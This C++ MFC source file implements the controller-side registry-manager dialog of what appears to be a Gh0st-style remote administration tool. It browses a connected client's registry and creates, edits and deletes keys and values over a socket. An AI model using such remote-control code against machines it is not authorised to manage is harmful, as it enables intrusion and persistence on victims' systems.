// CRegDlg.cpp: 实现文件
//

#include "pch.h"
#include "nbclass.h"
#include "CRegDlg.h"
#include "afxdialogex.h"
#include"../../common/macros.h"

#include"CRegDataDlg.h"

enum KEYVALUE
{
	MREG_SZ,
	MREG_DWORD,
	MREG_QWORD,
	MREG_BINARY,
	MREG_EXPAND_SZ,
	MREG_MULTI_SZ
};

struct REGMSG
{
	int count;         //名字个数
	DWORD size;        //名字大小
	DWORD valsize;     //值大小	
};

// CRegDlg 对话框

IMPLEMENT_DYNAMIC(CRegDlg, CDialog)

CRegDlg::CRegDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext* pContext)
	: CDialog(IDD_REGDLG, pParent)
{
	m_iocpServer = pIOCPServer;
	m_pContext = pContext;
	m_hIcon = AfxGetApp()->LoadIcon(IDI_REG_ICON);
	how = 0;
	isEnable = true;
	isEdit = false;

}

CRegDlg::~CRegDlg()
{
}

void CRegDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_REGPATH, m_tree);
	DDX_Control(pDX, IDC_REGVALUE, m_list);
}


BEGIN_MESSAGE_MAP(CRegDlg, CDialog)
	ON_WM_SIZE()
	ON_WM_CLOSE()
	ON_NOTIFY(TVN_SELCHANGED, IDC_REGPATH, &CRegDlg::OnTvnSelchangedRegpath)
	ON_NOTIFY(NM_RCLICK, IDC_REGPATH, &CRegDlg::OnNMRClickRegpath)
	ON_NOTIFY(NM_RCLICK, IDC_REGVALUE, &CRegDlg::OnNMRClickRegvalue)
	ON_COMMAND(ID_THREE_32819, &CRegDlg::OnRegDel)
	ON_COMMAND(ID_THREE_32818, &CRegDlg::OnRegtCreat)
	ON_COMMAND(ID_REGVAULE_32820, &CRegDlg::OnEdit)
	ON_COMMAND(ID_REGVAULE_32821, &CRegDlg::Ondel)
	ON_COMMAND(ID_REGVAULE_32822, &CRegDlg::OnRegNew)
END_MESSAGE_MAP()


// CRegDlg 消息处理程序


void CRegDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialog::OnSize(nType, cx, cy);

	// TODO: Add your message handler code here
	if (m_list.m_hWnd == NULL)return;
	if (m_tree.m_hWnd == NULL)return;

	CRect treeRec, listRec;
	treeRec.top = treeRec.left = 0;
	//dlgrc.right=cx;
	//dlgrc.bottom=cy;
	treeRec.right = cx * 0.25;
	treeRec.bottom = cy - 20;
	m_tree.MoveWindow(treeRec);

	listRec.top = 0;
	listRec.left = treeRec.right + 10;
	listRec.right = cx;
	listRec.bottom = cy - 20;
	m_list.MoveWindow(listRec);
	int dcx = cx - treeRec.right - 15;
	for (int i = 0; i < 3; i++)
	{
		double dd = size[i];
		dd /= 510;
		dd *= dcx;
		int lenth = dd;
		m_list.SetColumnWidth(i, (lenth));
	}

	if (m_wndStatusBar.m_hWnd != NULL)
	{
		CRect rc;
		rc.top = cy - 20;
		rc.left = 0;
		rc.right = cx;
		rc.bottom = cy;
		m_wndStatusBar.MoveWindow(rc);
	}
}


void CRegDlg::OnClose()
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值

	m_pContext->m_Dialog[0] = 0;
	closesocket(m_pContext->m_Socket);
	DestroyWindow();
}


BOOL CRegDlg::OnInitDialog()
{
	CDialog::OnInitDialog();
	// TODO: Add extra initialization here
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	CString str;
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	str.Format("\\\\%s - 注册表管理", bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "");
	SetWindowText(str);
	

	initView();
	// TODO:  在此添加额外的初始化

	return TRUE;  // return TRUE unless you set the focus to a control
				  // 异常: OCX 属性页应返回 FALSE
}


BOOL CRegDlg::PreTranslateMessage(MSG* pMsg)
{
	if (pMsg->message == WM_KEYDOWN && (pMsg->wParam == VK_RETURN || pMsg->wParam == VK_ESCAPE))
	{
		return true;
	}
	return CDialog::PreTranslateMessage(pMsg);

}


void CRegDlg::EnableCursor(bool b)
{
	if (b) {
		isEnable = true;
		::SetCursor(::LoadCursor(NULL, IDC_ARROW));
	}
	else {
		isEnable = false;
		::SetCursor(LoadCursor(NULL, IDC_WAIT));
	}
}

DWORD CRegDlg::atod(char* ch)
{
	int len = strlen(ch);
	DWORD d = 0;
	for (int i = 0; i < len; i++)
	{
		int t = ch[i] - 48;   //这位上的数字
		if (ch[i] > 57 || ch[i] < 48) //不是数字
		{
			return d;
		}
		d *= 10;
		d += t;
	}
	return d;
}

void CRegDlg::TestOK()
{
	//执行了什么操作    1，删除项  2，新建项   3，删除键  4， 新建键  5，编辑键  
	if (how == 1)
	{
		while (m_tree.GetChildItem(SelectNode) != NULL)
		{
			m_tree.DeleteItem(m_tree.GetChildItem(SelectNode));        //删除 会产生 OnSelchangingTree事件 ***
		}
		m_tree.DeleteItem(SelectNode);
		how = 0;
	}
	else if (how == 2)
	{
		m_tree.InsertItem(Path, 1, 1, SelectNode, 0);//插入子键名称
		m_tree.Expand(SelectNode, TVE_EXPAND);
		Path = "";
	}
	else if (how == 3)
	{
		if (index != 0)
			m_list.DeleteItem(index);
		else
		{
			m_list.SetItemText(index, 1, "REG_SZ");
			m_list.SetItemText(index, 2, "(数值未设置)");
			m_list.SetItemData(index, FALSE);
		}
		index = 0;
	}
	else if (how == 4)
	{
		int nitem;
		char dwValueDate[256];
		DWORD dwValueTemp = 0;
		QWORD dd;
		switch (this->type)
		{
		case MREG_SZ:     //加了字串
			nitem = m_list.InsertItem(m_list.GetItemCount(), Key, 0);
			m_list.SetItemText(nitem, 1, "REG_SZ");
			m_list.SetItemText(nitem, 2, Value);
			m_list.SetItemData(nitem, TRUE);
			break;
		case MREG_DWORD:  //加了DWORD
			dwValueTemp = atoi(Value.GetBuffer(0));
			sprintf(dwValueDate, "0x%08x(%u)", dwValueTemp, dwValueTemp);
			nitem = m_list.InsertItem(m_list.GetItemCount(), Key, 1);
			m_list.SetItemText(nitem, 1, "REG_DWORD");
			m_list.SetItemText(nitem, 2, dwValueDate);
			m_list.SetItemData(nitem, TRUE);
			break;
		case MREG_EXPAND_SZ:
			nitem = m_list.InsertItem(m_list.GetItemCount(), Key, 0);
			m_list.SetItemText(nitem, 1, "REG_EXPAND_SZ");
			m_list.SetItemText(nitem, 2, Value);
			m_list.SetItemData(nitem, TRUE);
			break;
		case MREG_QWORD:  //改了QWORD
			dd = _atoi64(Value.GetBuffer(0));
			sprintf(dwValueDate, "0x%llx(%llu)", dd, dd);
			nitem = m_list.InsertItem(m_list.GetItemCount(), Key, 1);
			m_list.SetItemText(nitem, 1, "REG_QWORD");
			m_list.SetItemText(nitem, 2, dwValueDate);
			m_list.SetItemData(nitem, TRUE);
			break;
		default:
			break;
		}
	}
	else if (how == 5)
	{
		int nitem;
		char dwValueDate[256];
		DWORD dwValueTemp = 0;
		DWORD64 dd;
		switch (type)
		{
		case MREG_SZ:     //改了字串
			m_list.SetItemText(index, 2, Value);
			m_list.SetItemData(index, TRUE);
			break;
		case MREG_DWORD:  //改了DWORD
			dwValueTemp = atod(Value.GetBuffer(0));
			sprintf(dwValueDate, "0x%08x(%u)", dwValueTemp, dwValueTemp);
			m_list.SetItemText(index, 2, dwValueDate);
			m_list.SetItemData(index, TRUE);
			break;
		case MREG_QWORD:  //改了QWORD
			dd = _atoi64(Value.GetBuffer(0));
			sprintf(dwValueDate, "0x%llx(%llu)", dd, dd);
			m_list.SetItemText(index, 2, dwValueDate);
			m_list.SetItemData(index, TRUE);
			break;
		case MREG_EXPAND_SZ:
			m_list.SetItemText(index, 2, Value);
			m_list.SetItemData(index, TRUE);
			break;
		default:
			break;
		}
	}

	how = 0;

}

void CRegDlg::addKey(char* buf)
{
	m_list.DeleteAllItems();
	int nitem = m_list.InsertItem(0, "(默认)", 0);
	m_list.SetItemText(nitem, 1, "REG_SZ");
	m_list.SetItemText(nitem, 2, "(数值未设置)");
	m_list.SetItemData(nitem, FALSE);
	if (buf == NULL) return;

	REGMSG msg;
	memcpy((void*)&msg, buf, sizeof(msg));
	char* temp = buf + sizeof(msg);
	for (int i = 0; i < msg.count; i++)
	{
		BYTE Type = temp[0];   //取出标志头
		temp += sizeof(BYTE);
		char* szValueName = temp;   //取出名字
		temp += msg.size;
		BYTE* szValueDate = (BYTE*)temp;      //取出值
		temp += msg.valsize;

		if (Type == MREG_SZ)
		{
			if (strlen(szValueName) == 0)
			{
				m_list.SetItemText(0, 2, (char*)szValueDate);
				m_list.SetItemData(0, TRUE);
			}
			else
			{
				int nitem = m_list.InsertItem(m_list.GetItemCount(), szValueName, 0);
				m_list.SetItemText(nitem, 1, "REG_SZ");
				m_list.SetItemText(nitem, 2, (char*)szValueDate);
				m_list.SetItemData(nitem, TRUE);
			}
		}
		else if (Type == MREG_DWORD)
		{
			char dwValueDate[256];
			DWORD dwValueTemp = 0;
			memcpy(&dwValueTemp, szValueDate, sizeof(DWORD));
			sprintf(dwValueDate, "0x%08x(%u)", dwValueTemp, dwValueTemp);
			if (strlen(szValueName) == 0)
			{
				m_list.SetItemText(0, 2, dwValueDate);
				m_list.SetItemData(0, TRUE);
			}
			else
			{
				int nitem = m_list.InsertItem(m_list.GetItemCount(), szValueName, 1);
				m_list.SetItemText(nitem, 1, "REG_DWORD");
				m_list.SetItemText(nitem, 2, dwValueDate);
				m_list.SetItemData(nitem, TRUE);
			}
		}
		else if (Type == MREG_QWORD)
		{
			char qwValueDate[256];
			unsigned __int64 qwValueTemp;
			memcpy(&qwValueTemp, szValueDate, sizeof(unsigned __int64));
			sprintf(qwValueDate, qwValueTemp <= 0xffffffff ? "0x%08I64x(%I64u)" : "0x%I64x(%I64u)", qwValueTemp, qwValueTemp);
			if (strlen(szValueName) == 0)
			{
				m_list.SetItemText(0, 2, qwValueDate);
				m_list.SetItemData(0, TRUE);
			}
			else
			{
				int nitem = m_list.InsertItem(m_list.GetItemCount(), szValueName, 1);
				m_list.SetItemText(nitem, 1, "REG_QWORD");
				m_list.SetItemText(nitem, 2, qwValueDate);
				m_list.SetItemData(nitem, TRUE);
			}
		}
		else if (Type == MREG_BINARY)
		{
			int nValueLength = strlen((const char*)szValueDate);
			char* biValueDate = new char[nValueLength * 3];
			char* pTmpChar = (char*)szValueDate;
			char* pOutChar = biValueDate;
			for (size_t i = 0; i < nValueLength; i++)
			{
				if (i == nValueLength - 1)
				{
					sprintf(pOutChar, "%02x", (unsigned char)*pTmpChar++);
					pOutChar += 2;
				}
				else
				{
					sprintf(pOutChar, "%02x ", (unsigned char)*pTmpChar++);
					pOutChar += 3;
				}
			}
			if (strlen(szValueName) == 0)
			{
				m_list.SetItemText(0, 2, biValueDate);
				m_list.SetItemData(0, TRUE);
			}
			else
			{
				int nitem = m_list.InsertItem(m_list.GetItemCount(), szValueName, 1);
				m_list.SetItemText(nitem, 1, "REG_BINARY");
				m_list.SetItemText(nitem, 2, biValueDate);
				m_list.SetItemData(nitem, TRUE);
			}
			delete[] biValueDate;
		}
		else if (Type == MREG_EXPAND_SZ)
		{
			if (strlen(szValueName) == 0)
			{
				m_list.SetItemText(0, 2, (char*)szValueDate);
				m_list.SetItemData(0, TRUE);
			}
			else
			{
				int nitem = m_list.InsertItem(m_list.GetItemCount(), szValueName, 0);
				m_list.SetItemText(nitem, 1, "REG_EXPAND_SZ");
				m_list.SetItemText(nitem, 2, (char*)szValueDate);
				m_list.SetItemData(nitem, TRUE);
			}
		}
		else if (Type == MREG_MULTI_SZ)
		{
			CString strValueDate((LPCSTR)szValueDate, msg.valsize);
			char* pValueTemp = strValueDate.GetBuffer(0);
			for (DWORD i = 0; i < msg.valsize; i++)
			{
				if (*(WORD*)pValueTemp == 0)
					break;
				else if (*pValueTemp == '\0')
					*pValueTemp = ' ';
				pValueTemp++;
			}
			strValueDate.ReleaseBuffer();
			if (strlen(szValueName) == 0)
			{
				m_list.SetItemText(0, 2, strValueDate);
				m_list.SetItemData(0, TRUE);
			}
			else
			{
				int nitem = m_list.InsertItem(m_list.GetItemCount(), szValueName, 0);
				m_list.SetItemText(nitem, 1, "REG_MULTI_SZ");
				m_list.SetItemText(nitem, 2, strValueDate);
				m_list.SetItemData(nitem, TRUE);
			}
		}
		else continue;
	}

}

void CRegDlg::addPath(char* tmp)
{
	if (tmp == NULL) return;
	int msgsize = sizeof(REGMSG);
	REGMSG msg;
	memcpy((void*)&msg, tmp, msgsize);
	DWORD size = msg.size;
	int count = msg.count;

	if (size > 0 && count > 0) //一点保护措施
	{
		for (int i = 0; i < count; i++)
		{
			char* szKeyName = tmp + size * i + msgsize;
			m_tree.InsertItem(szKeyName, 1, 1, SelectNode, 0); //插入子键名称
			//m_tree.Expand(SelectNode,TVE_EXPAND); //去掉不展开树
		}
	}
}

void CRegDlg::OnReceiveComplete()
{

	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_REG_PATH:            //接收项
		addPath((char*)(m_pContext->m_DeCompressionBuffer.GetBuffer(1)));
		EnableCursor(true);
		break;
	case TOKEN_REG_KEY:             //接收键, 值
		addKey((char*)(m_pContext->m_DeCompressionBuffer.GetBuffer(1)));
		EnableCursor(true);
		break;
	case TOKEN_REG_OK:
		TestOK();
		isEdit = false;
		EnableCursor(true);
		break;
	default:
		EnableCursor(true);
		isEdit = false;
		break;
	}
}

// 创建状态条
static UINT indicators[] =
{
	ID_SEPARATOR
};

void CRegDlg::CreatStatusBar()
{
	if (!m_wndStatusBar.Create(this) ||
		!m_wndStatusBar.SetIndicators(indicators,
			sizeof(indicators) / sizeof(UINT)))
	{
		TRACE0("Failed to create status bar\n");
		return;      // fail to create
	}
	m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0), SBPS_STRETCH, 120);

	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0); //显示状态栏		
	CRect rc;
	::GetWindowRect(this->m_hWnd, rc);
	m_wndStatusBar.MoveWindow(rc);

	CString str;
	m_wndStatusBar.SetPaneText(0, str);
}

void CRegDlg::initView()
{
	size[0] = 120; size[1] = 80; size[2] = 310;
	m_list.InsertColumn(0, "名称", LVCFMT_LEFT, size[0], -1);
	m_list.InsertColumn(1, "类型", LVCFMT_LEFT, size[1], -1);
	m_list.InsertColumn(2, "数据", LVCFMT_LEFT, size[2], -1);
	m_list.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT | LVS_EX_UNDERLINEHOT | LVS_EX_SUBITEMIMAGES | LVS_EX_GRIDLINES);

	//////添加图标//////
	m_HeadIcon.Create(16, 16, TRUE, 2, 2);
	m_HeadIcon.Add(AfxGetApp()->LoadIcon(IDI_STR_ICO));
	m_HeadIcon.Add(AfxGetApp()->LoadIcon(IDI_DWORD));
	m_list.SetImageList(&m_HeadIcon, LVSIL_SMALL);

	//树控件设置
	HICON hIcon = NULL;
	m_ImageList_tree.Create(18, 18, ILC_COLOR16, 10, 0);

	hIcon = (HICON)::LoadImage(::AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_FATHER_ICON), IMAGE_ICON, 18, 18, 0);
	m_ImageList_tree.Add(hIcon);
	hIcon = (HICON)::LoadImage(::AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_DIR_ICON), IMAGE_ICON, 32, 32, 0);
	m_ImageList_tree.Add(hIcon);
	m_tree.SetImageList(&m_ImageList_tree, TVSIL_NORMAL);


	DWORD	dwStyle = GetWindowLong(m_tree.m_hWnd, GWL_STYLE);

	dwStyle |= TVS_HASBUTTONS | TVS_HASLINES | TVS_LINESATROOT;
	SetWindowLong(m_tree.m_hWnd, GWL_STYLE, dwStyle);

	m_hRoot = m_tree.InsertItem("计算机", 0, 0, 0, 0);

	HKCR = m_tree.InsertItem("HKEY_CLASSES_ROOT", 1, 1, m_hRoot, 0);
	HKCU = m_tree.InsertItem("HKEY_CURRENT_USER", 1, 1, m_hRoot, 0);
	HKLM = m_tree.InsertItem("HKEY_LOCAL_MACHINE", 1, 1, m_hRoot, 0);
	HKUS = m_tree.InsertItem("HKEY_USERS", 1, 1, m_hRoot, 0);
	HKCC = m_tree.InsertItem("HKEY_CURRENT_CONFIG", 1, 1, m_hRoot, 0);

	m_tree.Expand(m_hRoot, TVE_EXPAND);

	CreatStatusBar();

	CRect rect;
	GetWindowRect(&rect);
	rect.bottom += 20;
	MoveWindow(&rect, true);
}

/// <summary>
/// 点击树形节点
/// </summary>
/// <param name="pNMHDR"></param>
/// <param name="pResult"></param>
void CRegDlg::OnTvnSelchangedRegpath(NMHDR* pNMHDR, LRESULT* pResult)
{
	NM_TREEVIEW* pNMTreeView = (NM_TREEVIEW*)pNMHDR;
	// TODO: Add your control notification handler code here
	if (!isEnable) return;
	TVITEM item = pNMTreeView->itemNew;

	if (item.hItem == m_hRoot)
	{
		m_list.DeleteAllItems();
		return;
	}
	SelectNode = item.hItem;			//保存用户打开的子树节点句柄

	m_list.DeleteAllItems();

	CString FullPath = GetFullPath(SelectNode);
	m_wndStatusBar.SetPaneText(0, FullPath);
	HTREEITEM CurrentNode = item.hItem; //取得此节点的全路径

	while (m_tree.GetChildItem(CurrentNode) != NULL)
	{
		m_tree.DeleteItem(m_tree.GetChildItem(CurrentNode));        //删除 会产生 OnSelchangingTree事件 ***
	}

	char bToken = getFatherPath(FullPath);
	//愈加一个键
	int nitem = m_list.InsertItem(0, "(默认)", 0);
	m_list.SetItemText(nitem, 1, "REG_SZ");
	m_list.SetItemText(nitem, 2, "(数值未设置)");
	m_list.SetItemData(nitem, FALSE);
	//BeginWaitCursor(); 
	//char *buf=new char[FullPath.GetLength]
	FullPath.Insert(0, bToken);      //插入那个根键
	bToken = COMMAND_REG_FIND;
	FullPath.Insert(0, bToken);      //插入查询命令

	EnableCursor(false);
	m_iocpServer->Send(m_pContext, (LPBYTE)(FullPath.GetBuffer(0)), FullPath.GetLength() + 1);
	*pResult = 0;
}

CString CRegDlg::GetFullPath(HTREEITEM hCurrent)
{
	CString strTemp;
	CString strReturn = "";
	while (1)
	{
		if (hCurrent == m_hRoot) return strReturn;
		strTemp = m_tree.GetItemText(hCurrent);   //得到当前的
		if (strTemp.Right(1) != "\\")
			strTemp += "\\";
		strReturn = strTemp + strReturn;
		hCurrent = m_tree.GetParentItem(hCurrent);   //得到父的

	}
	return strReturn;
}

char CRegDlg::getFatherPath(CString& FullPath)
{
	char bToken;
	if (!FullPath.Find("HKEY_CLASSES_ROOT"))	//判断主键
	{

		bToken = MHKEY_CLASSES_ROOT;
		FullPath.Delete(0, sizeof("HKEY_CLASSES_ROOT"));
	}
	else if (!FullPath.Find("HKEY_CURRENT_USER"))
	{
		bToken = MHKEY_CURRENT_USER;
		FullPath.Delete(0, sizeof("HKEY_CURRENT_USER"));

	}
	else if (!FullPath.Find("HKEY_LOCAL_MACHINE"))
	{
		bToken = MHKEY_LOCAL_MACHINE;
		FullPath.Delete(0, sizeof("HKEY_LOCAL_MACHINE"));

	}
	else if (!FullPath.Find("HKEY_USERS"))
	{
		bToken = MHKEY_USERS;
		FullPath.Delete(0, sizeof("HKEY_USERS"));

	}
	else if (!FullPath.Find("HKEY_CURRENT_CONFIG"))
	{
		bToken = MHKEY_CURRENT_CONFIG;
		FullPath.Delete(0, sizeof("HKEY_CURRENT_CONFIG"));

	}
	return bToken;
}


/// <summary>
/// 树节点菜单
/// </summary>
/// <param name="pNMHDR"></param>
/// <param name="pResult"></param>
void CRegDlg::OnNMRClickRegpath(NMHDR* pNMHDR, LRESULT* pResult)
{
	// TODO: Add your control notification handler code here
	if (!isEnable) return;
	CPoint	point;
	GetCursorPos(&point);
	m_tree.ScreenToClient(&point);
	UINT uFlags;
	HTREEITEM hItem = m_tree.HitTest(point, &uFlags);

	if ((hItem != NULL) && (TVHT_ONITEM & uFlags))
	{
		if (hItem == m_hRoot)
		{
			return;
		}

		SelectNode = hItem;
		m_tree.Select(hItem, TVGN_CARET);
		CMenu	popup;
		popup.LoadMenu(IDR_REGTHREE);
		CMenu* pM = popup.GetSubMenu(0);
		CPoint	p;
		GetCursorPos(&p);

		pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);//加上这句没有右键图标
	//CXTPCommandBars::TrackPopupMenu(pM, 0, p.x, p.y, this);

	}
	*pResult = 0;
}

/// <summary>
/// 值列表菜单
/// </summary>
/// <param name="pNMHDR"></param>
/// <param name="pResult"></param>
void CRegDlg::OnNMRClickRegvalue(NMHDR* pNMHDR, LRESULT* pResult)
{
	// TODO: Add your control notification handler code here
	if (!isEnable) return;
	if (SelectNode == m_hRoot)
	{
		return;
	}

	CMenu	popup;
	popup.LoadMenu(IDR_REGVAULE);
	CMenu* pM = popup.GetSubMenu(0);
	CPoint	p;
	GetCursorPos(&p);

	if (m_list.GetSelectedCount() == 0)             //没有选中
	{
		pM->EnableMenuItem(0, MF_BYPOSITION | MF_GRAYED);     //编辑
		pM->EnableMenuItem(1, MF_BYPOSITION | MF_GRAYED);     //删除
	}

	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);//加上这句没有右键图标

	*pResult = 0;
}

/// <summary>
/// 删除项
/// </summary>
void CRegDlg::OnRegDel()

{	// TODO: Add your command handler code here
	CString FullPath = GetFullPath(SelectNode);      //得到全路径
	char bToken = getFatherPath(FullPath);
	//        COMMAND_REG_DELPATH

	FullPath.Insert(0, bToken);//插入  那个根键
	bToken = COMMAND_REG_DELPATH;
	FullPath.Insert(0, bToken);      //插入查询命令
	how = 1;
	m_iocpServer->Send(m_pContext, (LPBYTE)(FullPath.GetBuffer(0)), FullPath.GetLength() + 1);// TODO: 在此添加命令处理程序代码
}

/// <summary>
/// 新建项
/// </summary>
void CRegDlg::OnRegtCreat()
{
	// TODO: Add your command handler code here
	CRegDataDlg dlg(this,"新建项");
	dlg.m_Enable = true;
	dlg.m_Radio = true;

	if (dlg.DoModal() == IDOK)
	{
		CString FullPath = GetFullPath(SelectNode);      //得到全路径
		FullPath += dlg.m_name;
		char bToken = getFatherPath(FullPath);
		FullPath.Insert(0, bToken);//插入  那个根键
		bToken = COMMAND_REG_CREATEPATH;
		FullPath.Insert(0, bToken);      //插入查询命令
		how = 2;
		Path = dlg.m_name;
		m_iocpServer->Send(m_pContext, (LPBYTE)(FullPath.GetBuffer(0)), FullPath.GetLength() + 1);
	}
}

/// <summary>
/// 获取当前数据类型
/// </summary>
/// <param name="index"></param>
/// <returns></returns>
BYTE CRegDlg::getType(int index)
{
	if (index < 0) return 100;
	CString strType = m_list.GetItemText(index, 1);      //得到类型
	if (strType == "REG_SZ")
		return  MREG_SZ;
	else if (strType == "REG_DWORD")
		return MREG_DWORD;
	else if (strType == "REG_EXPAND_SZ")
		return MREG_EXPAND_SZ;
	else if (strType == "REG_QWORD")
		return MREG_QWORD;
	else
		return 100;
}

/// <summary>
/// 编辑值
/// </summary>
/// <param name="types"></param>
/// <param name="title"></param>
void CRegDlg::OnRegEdit(BYTE types, CString title)
{
	CRegDataDlg dlg(this, title);
	dlg.m_editname = true;
	if (isEdit) //是编辑
	{
		dlg.m_name = Key;
		dlg.m_data = Value;
		dlg.type = types;
	}
	dlg.m_Radio = true;

	if (dlg.DoModal() == IDOK)
	{

		CString FullPath = GetFullPath(SelectNode);      //得到全路径
		char bToken = getFatherPath(FullPath);
		DWORD size = 1 + 1 + 1 + sizeof(REGMSG) + FullPath.GetLength() + dlg.m_name.GetLength() + dlg.m_data.GetLength() + 6;
		char* buf = new char[size];
		ZeroMemory(buf, size);

		REGMSG msg;
		msg.count = FullPath.GetLength();            //项大小
		msg.size = dlg.m_name.GetLength();          //键大小
		msg.valsize = dlg.m_data.GetLength();        //数据大小

		buf[0] = COMMAND_REG_CREATKEY;               //数据头
		buf[1] = types;                           //值类型
		buf[2] = bToken;                           //父键
		memcpy(buf + 3, (void*)&msg, sizeof(msg));                     //数据头
		char* tmp = buf + 3 + sizeof(msg);
		if (msg.count > 0)
			memcpy(tmp, FullPath.GetBuffer(0), msg.count);        //项  
		tmp += msg.count;
		if (m_list.GetSelectionMark() == 0)
			memcpy(tmp, "", 1);                //修改默认键名
		else
			memcpy(tmp, dlg.m_name.GetBuffer(0), msg.size);          //键名
		tmp += msg.size;
		memcpy(tmp, dlg.m_data.GetBuffer(0), msg.valsize);          //值
		tmp = buf + 3 + sizeof(msg);

		// 善后
		this->type = types;
		how = 4;
		Key = dlg.m_name;
		Value = dlg.m_data;

		m_iocpServer->Send(m_pContext, (LPBYTE)(buf), size);
		delete[] buf;
	}

	isEdit = false;
}


void CRegDlg::OnEdit()
{

	int index = m_list.GetSelectionMark();
	if (index < 0) return;
	BYTE b = getType(index);

	switch (b)
	{
	case MREG_SZ:
		isEdit = true;             //变为可编辑状态
		Key = m_list.GetItemText(index, 0);       //得到名
		if (!m_list.GetItemData(index))
			Value = "";
		else
			Value = m_list.GetItemText(index, 2); //得到值
		OnRegEdit(b,"修改值");
		how = 5;
		this->index = index;
		break;
	case MREG_DWORD:
		isEdit = true;             //变为可编辑状态
		Key = m_list.GetItemText(index, 0);       //得到名
		if (!m_list.GetItemData(index))
			Value = "";
		else
		{
			Value.Format("%s", m_list.GetItemText(index, 2)); //得到值
			Value.Delete(0, Value.Find('(') + 1); // 去掉括号
			Value.Delete(Value.GetLength() - 1);
		}
		OnRegEdit(b, "修改值");
		how = 5;
		this->index = index;
		break;
	case MREG_EXPAND_SZ:
		isEdit = true;             //变为可编辑状态
		Key = m_list.GetItemText(index, 0);       //得到名
		if (!m_list.GetItemData(index))
			Value = "";
		else
			Value = m_list.GetItemText(index, 2); //得到值
		OnRegEdit(b, "修改值");
		how = 5;
		this->index = index;
		break;
	case MREG_QWORD:
		isEdit = true;             //变为可编辑状态
		Key = m_list.GetItemText(index, 0);       //得到名
		if (!m_list.GetItemData(index))
			Value = "";
		else
		{
			Value.Format("%s", m_list.GetItemText(index, 2)); //得到值
			Value.Delete(0, Value.Find('(') + 1); // 去掉括号
			Value.Delete(Value.GetLength() - 1);
		}
		OnRegEdit(b, "修改值");
		how = 5;
		this->index = index;
		break;
	default:
		break;
	}
}
//删除键
void CRegDlg::Ondel()
{	// TODO: Add your command handler code here
	REGMSG msg;

	int index = m_list.GetSelectionMark();

	CString FullPath = GetFullPath(SelectNode);      //得到全路径
	char bToken = getFatherPath(FullPath);

	CString key = m_list.GetItemText(index, 0);      //得到键名

	msg.size = FullPath.GetLength();              //  项名大小
	msg.valsize = key.GetLength();               //键名大小

	int datasize = sizeof(msg) + msg.size + msg.valsize + 4;
	char* buf = new char[datasize];
	ZeroMemory(buf, datasize);

	buf[0] = COMMAND_REG_DELKEY;     //命令头
	buf[1] = bToken;              //主键
	memcpy(buf + 2, (void*)&msg, sizeof(msg));                     //数据头
	if (msg.size > 0)        //根键 就不用写项了
		memcpy(buf + 2 + sizeof(msg), FullPath.GetBuffer(0), FullPath.GetLength());  //项值
	if (index == 0)
		memcpy(buf + 2 + sizeof(msg) + FullPath.GetLength(), "", 1);  //删除默认键值
	else
		memcpy(buf + 2 + sizeof(msg) + FullPath.GetLength(), key.GetBuffer(0), key.GetLength());  //键值
	how = 3;
	this->index = index;
	m_iocpServer->Send(m_pContext, (LPBYTE)(buf), datasize);
	delete[] buf;
}

/// <summary>
/// 新建键
/// </summary>
void CRegDlg::OnRegNew()
{
	
	CRegDataDlg dlg(this, "新建");

	if (dlg.DoModal() == IDOK)
	{

		if (dlg.type == MREG_SZ || dlg.type == MREG_DWORD || dlg.type == MREG_QWORD || dlg.type == MREG_EXPAND_SZ)
		{
			CString FullPath = GetFullPath(SelectNode);      //得到全路径
			char bToken = getFatherPath(FullPath);
			DWORD size = 1 + 1 + 1 + sizeof(REGMSG) + FullPath.GetLength() + dlg.m_name.GetLength() + dlg.m_data.GetLength() + 6;
			char* buf = new char[size];

			ZeroMemory(buf, size);

			REGMSG msg;
			msg.count = FullPath.GetLength();            //项大小
			msg.size = dlg.m_name.GetLength();          //键大小
			msg.valsize = dlg.m_data.GetLength();        //数据大小

			buf[0] = COMMAND_REG_CREATKEY;               //数据头
			buf[1] = dlg.type;                           //值类型
			buf[2] = bToken;                           //父键
			memcpy(buf + 3, (void*)&msg, sizeof(msg));                     //数据头
			char* tmp = buf + 3 + sizeof(msg);
			if (msg.count > 0)
				memcpy(tmp, FullPath.GetBuffer(0), msg.count);        //项  
			tmp += msg.count;
			memcpy(tmp, dlg.m_name.GetBuffer(0), msg.size);          //键名
			tmp += msg.size;
			memcpy(tmp, dlg.m_data.GetBuffer(0), msg.valsize);          //值
			tmp = buf + 3 + sizeof(msg);
			// 善后
			type = dlg.type;
			how = 4;
			Key = dlg.m_name;
			Value = dlg.m_data;

			m_iocpServer->Send(m_pContext, (LPBYTE)(buf), size);
			delete[] buf;
		}

	}
	
}
